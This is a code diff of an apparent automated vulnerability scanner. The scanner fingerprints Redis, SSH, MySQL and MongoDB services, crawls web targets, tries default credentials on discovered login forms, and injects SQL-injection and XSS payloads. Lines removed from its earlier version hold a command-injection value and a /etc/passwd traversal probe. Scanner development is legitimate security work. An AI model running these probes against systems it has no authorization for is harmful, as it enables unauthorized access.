@@ -33,111 +33,76 @@ function normalizeTargetForHost(target: string): string {
   return target.replace(/host\.docker\.internal/gi, "localhost")
 }
 
-/** Generate a smart probe script based on target type (TCP service vs HTTP) */
+/** Generate a generic probe script based on target type (TCP service vs HTTP) */
 function buildExecuteCodeScript(target: string): string {
-  // Redis (port 6379)
-  if (target.includes(":6379")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
+  // TCP target: generic banner-based protocol detection (no port-to-service assumptions)
+  if (/^tcp:\/\//i.test(target) || (!target.startsWith("http") && target.includes(":"))) {
+    const cleaned = target.replace(/^tcp:\/\//i, "")
+    const colonIdx = cleaned.lastIndexOf(":")
+    const host = colonIdx > 0 ? cleaned.slice(0, colonIdx) : cleaned
+    const port = colonIdx > 0 ? cleaned.slice(colonIdx + 1) : "80"
     return `
 const net = require('net');
 const client = new net.Socket();
-client.setTimeout(10000);
-client.connect(6379, '${host}', () => {
-  client.write('INFO\\r\\n');
-});
-let data = '';
-client.on('data', (chunk) => {
-  data += chunk.toString();
-  if (data.includes('redis_version')) {
-    const version = data.match(/redis_version:([^\\r\\n]+)/)?.[1] || 'unknown';
-    const keys = data.match(/db0:keys=(\\d+)/)?.[1] || '0';
-    console.log(JSON.stringify({ vulnerability: 'Redis未授权访问', severity: '高', redis_version: version, total_keys: keys, unauthenticated: true, detail: 'Redis服务无需认证即可访问，可执行INFO/CONFIG/KEYS等命令' }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // SSH (port 22, 2222)
-  if (target.includes(":22") || target.includes(":2222")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    const port = target.match(/:(\d+)/)?.[1] || "22"
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-client.connect(${port}, '${host}', () => {});
-let data = '';
-client.on('data', (chunk) => {
-  data += chunk.toString();
-  if (data.includes('SSH-')) {
-    const banner = data.trim();
-    const oldVersions = ['OpenSSH_7', 'OpenSSH_6', 'OpenSSH_5', 'OpenSSH_4'];
-    const isOld = oldVersions.some(v => banner.includes(v));
-    console.log(JSON.stringify({ service: 'SSH', banner, port: ${port}, version_outdated: isOld, detail: isOld ? 'SSH版本过旧，可能存在已知漏洞' : 'SSH Banner已获取' }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // MongoDB (port 27017)
-  if (target.includes(":27017")) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-// MongoDB wire protocol: send isMaster command
-const doc = Buffer.from(JSON.stringify({ isMaster: 1 }));
-client.connect(27017, '${host}', () => {
-  // Simple OP_MSG for MongoDB 3.6+
-  const header = Buffer.alloc(16 + 5 + doc.length);
-  const totalLen = header.length;
-  header.writeInt32LE(totalLen, 0); // messageLength
-  header.writeInt32LE(1, 4); // requestID
-  header.writeInt32LE(0, 8); // responseTo
-  header.writeInt32LE(2013, 12); // opCode = OP_MSG
-  header.writeInt32LE(0, 16); // flagBits
-  header[20] = 0; // section kind 0 (body)
-  doc.copy(header, 21);
-  client.write(header);
+client.setTimeout(15000);
+const host = '${host}';
+const port = ${port};
+let identified = false;
+client.connect(port, host, () => {
+  // Many services send a banner on connect; wait briefly then send a neutral probe
+  setTimeout(() => { try { client.write('\\r\\n'); } catch {} }, 800);
 });
 let data = Buffer.alloc(0);
 client.on('data', (chunk) => {
+  if (identified) return;
   data = Buffer.concat([data, chunk]);
-  console.log(JSON.stringify({ vulnerability: 'MongoDB未授权访问', severity: '高', unauthenticated: true, response_length: data.length, detail: 'MongoDB服务无需认证即可连接，可直接访问数据库' }));
+  const text = data.toString('utf8');
+  // Detect protocol from actual response content (not port number)
+  if (text.includes('redis_version') || text.match(/^\\+OK/) || text.match(/^-ERR/) || text.match(/^-NOAUTH/)) {
+    identified = true;
+    const needsAuth = text.includes('-NOAUTH') || text.includes('-ERR operation not permitted');
+    const version = (text.match(/redis_version:([^\\r\\n]+)/) || [])[1] || '';
+    if (needsAuth) {
+      console.log(JSON.stringify({ service: 'Redis', port, version, requiresAuth: true, detail: 'Redis服务要求认证' }));
+    } else {
+      console.log(JSON.stringify({ vulnerability: '未授权访问', severity: '高', service: 'Redis', port, version, detail: '服务响应未要求认证，可能存在未授权访问' }));
+    }
+    client.destroy();
+  } else if (text.startsWith('SSH-')) {
+    identified = true;
+    console.log(JSON.stringify({ service: 'SSH', port, banner: text.trim().slice(0, 200), detail: 'SSH Banner已获取' }));
+    client.destroy();
+  } else if (data.length > 4 && data[3] === 0 && data[4] === 10) {
+    // MySQL greeting packet heuristic: packet number 0, protocol version 10
+    identified = true;
+    const nullIdx = data.indexOf(0, 5);
+    const version = nullIdx > 5 ? data.slice(5, nullIdx).toString('utf8') : 'unknown';
+    console.log(JSON.stringify({ service: 'MySQL', port, version, detail: 'MySQL握手包已获取' }));
+    client.destroy();
+  } else if (data.length > 16) {
+    // Check for MongoDB-like binary response (OP_REPLY or OP_MSG)
+    const opCode = data.length >= 16 ? data.readInt32LE(12) : 0;
+    if (opCode === 1 || opCode === 2013) {
+      identified = true;
+      console.log(JSON.stringify({ service: 'MongoDB', port, responseLength: data.length, detail: 'MongoDB协议响应已获取' }));
+      client.destroy();
+    } else if (data.length > 64) {
+      // Generic unidentified service
+      identified = true;
+      console.log(JSON.stringify({ service: 'unknown', port, banner: text.slice(0, 500), bannerHex: data.slice(0, 32).toString('hex'), detail: '已获取服务响应，协议待识别' }));
+      client.destroy();
+    }
+  }
+});
+client.on('timeout', () => {
+  if (!identified && data.length > 0) {
+    console.log(JSON.stringify({ service: 'unknown', port, banner: data.toString('utf8').slice(0, 500), detail: '连接超时但已收到部分数据' }));
+  } else if (!identified) {
+    console.log(JSON.stringify({ error: 'connection timeout', port, detail: '连接超时，服务可能未响应或端口被过滤' }));
+  }
   client.destroy();
 });
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
-`.trim()
-  }
-
-  // MySQL (port 3306, 13306, 13307)
-  if (target.match(/:(?:3306|13306|13307)/)) {
-    const host = target.replace(/^tcp:\/\//, "").split(":")[0]
-    const port = target.match(/:(\d+)/)?.[1] || "3306"
-    return `
-const net = require('net');
-const client = new net.Socket();
-client.setTimeout(10000);
-client.connect(${port}, '${host}', () => {});
-let data = Buffer.alloc(0);
-client.on('data', (chunk) => {
-  data = Buffer.concat([data, chunk]);
-  if (data.length > 4) {
-    const version = data.slice(5, data.indexOf(0, 5)).toString('utf8');
-    console.log(JSON.stringify({ service: 'MySQL', version, port: ${port}, detail: 'MySQL握手包已获取，版本: ' + version }));
-    client.destroy();
-  }
-});
-client.on('timeout', () => { console.log(JSON.stringify({ error: 'connection timeout' })); client.destroy(); });
-client.on('error', (e) => { console.log(JSON.stringify({ error: e.message })); });
+client.on('error', (e) => { console.log(JSON.stringify({ error: e.message, port })); });
 `.trim()
   }
 
@@ -172,22 +137,32 @@ async function run() {
   const server = home.headers['server'] || '';
   results.push({ step: 'identify', title, server, status: home.status });
 
-  // Step 2: Try default login (DVWA: admin/password)
+  // Step 2: Discover and try login (generic — no target-specific paths)
   let cookie = '';
-  const loginPaths = ['/login.php', '/dvwa/login.php', '/WebGoat/login', '/login'];
+  // Extract login links from homepage HTML
+  const linkMatches = home.body.match(/href=['"]([^'"]*login[^'"]*)['"]/gi) || [];
+  const discoveredLoginPaths = linkMatches.map(m => (m.match(/href=['"]([^'"]+)['"]/i) || [])[1]).filter(Boolean);
+  const loginPaths = [...new Set([...discoveredLoginPaths, '/login.php', '/login', '/admin/login', '/user/login', '/signin'])];
   for (const lp of loginPaths) {
     const loginPage = await request({ path: lp, method: 'GET' });
     if (!loginPage || loginPage.status >= 400) continue;
-    const tokenMatch = loginPage.body.match(/name=['"](user_token|csrf)['"]\s+value=['"]([^'"]+)/i);
-    const token = tokenMatch ? tokenMatch[2] : '';
+    // Extract all hidden fields (CSRF tokens, nonces, etc.)
+    const hiddenFields = {};
+    const hiddenMatches = loginPage.body.matchAll(/name=['"]([^'"]+)['"]\s[^>]*value=['"]([^'"]*)['"]/gi);
+    for (const hm of hiddenMatches) { if (hm[1] !== 'username' && hm[1] !== 'password') hiddenFields[hm[1]] = hm[2]; }
     const setCookie = loginPage.headers['set-cookie'];
     if (setCookie) cookie = (Array.isArray(setCookie) ? setCookie : [setCookie]).map(c => c.split(';')[0]).join('; ');
-    const creds = [['admin','password'],['admin','admin'],['admin','admin123']];
+    // Detect form field names from HTML
+    const userField = (loginPage.body.match(/name=['"]([^'"]*(?:user|login|email|account)[^'"]*)['"]/i) || [])[1] || 'username';
+    const passField = (loginPage.body.match(/name=['"]([^'"]*(?:pass|pwd)[^'"]*)['"]/i) || [])[1] || 'password';
+    const submitField = (loginPage.body.match(/name=['"]([^'"]*(?:submit|login|Login|btn)[^'"]*)['"]/i) || [])[1] || '';
+    const creds = [['admin','password'],['admin','admin'],['admin','admin123'],['root','root'],['test','test']];
     for (const [user, pass] of creds) {
-      let body = 'username=' + user + '&password=' + pass + '&Login=Login';
-      if (token) body += '&user_token=' + token;
-      const loginResp = await request({ path: lp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, body);
-      if (loginResp && (loginResp.status === 302 || loginResp.body.includes('Welcome') || loginResp.body.includes('welcome'))) {
+      const params = new URLSearchParams({ [userField]: user, [passField]: pass });
+      if (submitField) params.set(submitField, 'Login');
+      for (const [k, v] of Object.entries(hiddenFields)) params.set(k, v);
+      const loginResp = await request({ path: lp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, params.toString());
+      if (loginResp && (loginResp.status === 302 || loginResp.body.includes('Welcome') || loginResp.body.includes('welcome') || loginResp.body.includes('Dashboard') || loginResp.body.includes('logout'))) {
         const sc2 = loginResp.headers['set-cookie'];
         if (sc2) cookie = (Array.isArray(sc2) ? sc2 : [sc2]).map(c => c.split(';')[0]).join('; ');
         results.push({ vulnerability: '默认凭据登录成功', severity: '高', detail: 'Logged in with ' + user + ':' + pass + ' at ' + lp });
@@ -197,46 +172,41 @@ async function run() {
     if (cookie) break;
   }
 
-  // Step 3: Test SQL Injection
-  const sqliPaths = ['/vulnerabilities/sqli/', '/dvwa/vulnerabilities/sqli/'];
-  for (const sp of sqliPaths) {
-    const normal = await request({ path: sp + '?id=1&Submit=Submit', method: 'GET', headers: { 'Cookie': cookie } });
-    const injected = await request({ path: sp + "?id=1'+OR+'1'%3D'1&Submit=Submit", method: 'GET', headers: { 'Cookie': cookie } });
-    if (normal && injected && injected.body.length !== normal.body.length && !injected.body.includes('error')) {
-      results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi at ' + sp + ': normal response ' + normal.body.length + ' bytes vs injected ' + injected.body.length + ' bytes' });
-    }
-    if (injected && (injected.body.includes('mysql') || injected.body.includes('SQL syntax') || injected.body.includes('Surname'))) {
-      if (!results.some(r => r.vulnerability === 'SQL注入')) {
-        results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi confirmed at ' + sp + ': SQL error or extra data in response' });
+  // Step 3: Discover input points and test for vulnerabilities
+  // Crawl links from home page to find pages with forms/parameters
+  const pageLinks = (home.body.match(/href=['"](\\/[^'"#]*)['"]/gi) || [])
+    .map(m => (m.match(/href=['"]([^'"]+)['"]/i) || [])[1]).filter(Boolean);
+  const uniquePages = [...new Set(pageLinks)].slice(0, 10);
+
+  for (const pagePath of uniquePages) {
+    const page = await request({ path: pagePath, method: 'GET', headers: { 'Cookie': cookie } });
+    if (!page || page.status >= 400) continue;
+
+    // Find form inputs with parameters
+    const formAction = (page.body.match(/action=['"]([^'"]*)['"]/i) || [])[1] || pagePath;
+    const inputNames = [...page.body.matchAll(/name=['"]([^'"]+)['"]/gi)].map(m => m[1]).filter(n => !['submit','Submit','Login','user_token','csrf'].includes(n));
+    if (inputNames.length === 0) continue;
+
+    // Test each input for SQL injection (response length diff)
+    for (const param of inputNames.slice(0, 3)) {
+      const normalParams = new URLSearchParams({ [param]: '1' }); if (page.body.includes('Submit')) normalParams.set('Submit', 'Submit');
+      const injectParams = new URLSearchParams({ [param]: "1' OR '1'='1" }); if (page.body.includes('Submit')) injectParams.set('Submit', 'Submit');
+      const normal = await request({ path: formAction + '?' + normalParams, method: 'GET', headers: { 'Cookie': cookie } });
+      const injected = await request({ path: formAction + '?' + injectParams, method: 'GET', headers: { 'Cookie': cookie } });
+      if (normal && injected && Math.abs(injected.body.length - normal.body.length) > 50) {
+        results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQLi suspected at ' + formAction + ' param=' + param + ': response diff ' + Math.abs(injected.body.length - normal.body.length) + ' bytes' });
       }
-    }
-  }
-
-  // Step 4: Test Command Injection
-  const cmdiPaths = ['/vulnerabilities/exec/', '/dvwa/vulnerabilities/exec/'];
-  for (const cp of cmdiPaths) {
-    const resp = await request({ path: cp, method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': cookie } }, 'ip=127.0.0.1;id&Submit=Submit');
-    if (resp && (resp.body.includes('uid=') || resp.body.includes('root') || resp.body.includes('www-data'))) {
-      results.push({ vulnerability: '命令注入', severity: '高', detail: 'Command injection at ' + cp + ': system command output detected in response' });
-    }
-  }
-
-  // Step 5: Test XSS
-  const xssPaths = ['/vulnerabilities/xss_r/', '/dvwa/vulnerabilities/xss_r/'];
-  const xssPayload = '<script>alert(1)</script>';
-  for (const xp of xssPaths) {
-    const resp = await request({ path: xp + '?name=' + encodeURIComponent(xssPayload) + '#', method: 'GET', headers: { 'Cookie': cookie } });
-    if (resp && resp.body.includes(xssPayload)) {
-      results.push({ vulnerability: 'XSS（反射型）', severity: '中', detail: 'Reflected XSS at ' + xp + ': payload reflected unescaped in response' });
-    }
-  }
-
-  // Step 6: Test File Inclusion
-  const fiPaths = ['/vulnerabilities/fi/', '/dvwa/vulnerabilities/fi/'];
-  for (const fp of fiPaths) {
-    const resp = await request({ path: fp + '?page=....//....//....//etc/passwd', method: 'GET', headers: { 'Cookie': cookie } });
-    if (resp && (resp.body.includes('root:') || resp.body.includes('daemon:'))) {
-      results.push({ vulnerability: '文件包含', severity: '高', detail: 'Local File Inclusion at ' + fp + ': /etc/passwd content returned' });
+      if (injected && (injected.body.includes('SQL syntax') || injected.body.includes('mysql') || injected.body.includes('sqlite'))) {
+        if (!results.some(r => r.vulnerability === 'SQL注入' && r.detail.includes(param))) {
+          results.push({ vulnerability: 'SQL注入', severity: '高', detail: 'SQL error in response at ' + formAction + ' param=' + param });
+        }
+      }
+      // Test XSS
+      const xssPayload = '<script>alert(1)</script>';
+      const xssResp = await request({ path: formAction + '?' + param + '=' + encodeURIComponent(xssPayload), method: 'GET', headers: { 'Cookie': cookie } });
+      if (xssResp && xssResp.body.includes(xssPayload)) {
+        results.push({ vulnerability: 'XSS（反射型）', severity: '中', detail: 'Reflected XSS at ' + formAction + ' param=' + param });
+      }
     }
   }
 
